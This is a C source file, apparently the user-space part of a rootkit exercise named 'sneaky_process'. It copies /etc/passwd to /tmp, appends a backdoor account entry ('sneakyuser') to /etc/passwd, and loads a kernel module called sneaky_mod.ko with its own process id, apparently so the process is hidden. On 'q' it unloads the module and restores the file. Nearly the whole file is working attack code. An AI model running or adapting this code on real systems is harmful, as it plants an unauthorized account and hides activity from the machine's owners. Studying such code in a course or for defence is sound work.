#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

/*
 * duplicate_file: Copies the content of the source file to the destination file.
 * This function reads from src_path and writes the contents to dst_path.
 */
void duplicate_file(const char *src_path, const char *dst_path)
{
    FILE *src = fopen(src_path, "r");
    if (!src) {
        perror("Error opening source file");
        exit(EXIT_FAILURE);
    }
    FILE *dst = fopen(dst_path, "w");
    if (!dst) {
        perror("Error opening destination file");
        fclose(src);
        exit(EXIT_FAILURE);
    }
    int ch;
    while ((ch = fgetc(src)) != EOF) {
        fputc(ch, dst);
    }
    fclose(src);
    fclose(dst);
}

/*
 * append_entry: Appends a new line at the end of a file.
 * This function opens the file in append mode and writes the specified text to it.
 */
void append_entry(const char *file_path, const char *entry)
{
    FILE *fp = fopen(file_path, "a");
    if (!fp) {
        perror("Error opening file for appending");
        exit(EXIT_FAILURE);
    }
    fprintf(fp, "%s\n", entry);
    fclose(fp);
}

int main()
{
    char cmd[256];

    printf("sneaky_process pid = %d\n", getpid());

    // Backup /etc/passwd to /tmp/passwd
    duplicate_file("/etc/passwd", "/tmp/passwd");

    // Append a malicious entry to the end of /etc/passwd
    append_entry("/etc/passwd", "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");

    // Load the kernel module and pass the sneaky_pid parameter
    snprintf(cmd, sizeof(cmd), "insmod sneaky_mod.ko sneaky_pid=%d", getpid());
    system(cmd);

    // Wait for the user to enter 'q' to quit (no need to press enter after 'q')
    char ch;
    while ((ch = getchar()) != 'q') {
        /* Do nothing until 'q' is pressed */
    }

    // Unload the kernel module
    system("rmmod sneaky_mod");

    // Restore the original /etc/passwd file
    duplicate_file("/tmp/passwd", "/etc/passwd");
    // Remove the backup file
    system("rm -f /tmp/passwd");

    return EXIT_SUCCESS;
}
